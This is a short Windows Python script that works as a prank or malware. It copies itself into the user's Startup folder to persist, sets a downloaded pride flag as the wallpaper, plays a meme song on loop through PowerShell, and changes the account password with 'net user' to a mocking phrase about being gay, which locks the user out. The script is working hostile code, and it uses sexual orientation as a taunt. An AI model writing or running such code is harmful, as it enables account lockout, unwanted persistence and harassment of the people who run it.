import os
import requests
import ctypes
import subprocess
import getpass

# Check if script is in the startup directory
username = getpass.getuser()
startup_dir = os.path.join("C:/Users/", username, "AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup/")
script_path = os.path.realpath(__file__)

if script_path != startup_dir:
    # Move script to startup directory
    subprocess.call(f"move {script_path} {startup_dir}")

# Download LGBTQ flag and save it as wallpaper
lgbtq_flag_url = "https://upload.wikimedia.org/wikipedia/commons/thumb/4/48/Gay_Pride_Flag.svg/2560px-Gay_Pride_Flag.svg.png"
lgbtq_flag_path = os.path.join(os.getcwd(), "lgbtq_flag.png")
with open(lgbtq_flag_path, "wb") as f:
    f.write(requests.get(lgbtq_flag_url).content)
ctypes.windll.user32.SystemParametersInfoW(20, 0, lgbtq_flag_path, 0)

# Download "4 Big Guys" song and play it on loop
song_url = "https://www.myinstants.com/media/sounds/4-big-guys-1.mp3"
song_path = os.path.join(os.getcwd(), "4_big_guys.mp3")
with open(song_path, "wb") as f:
    f.write(requests.get(song_url).content)
subprocess.Popen(f"powershell -c (New-Object Media.SoundPlayer '{song_path}').PlayLooping()")

# Change user's password
new_password = "I am gay"
subprocess.call(f"net user {username} {new_password}")
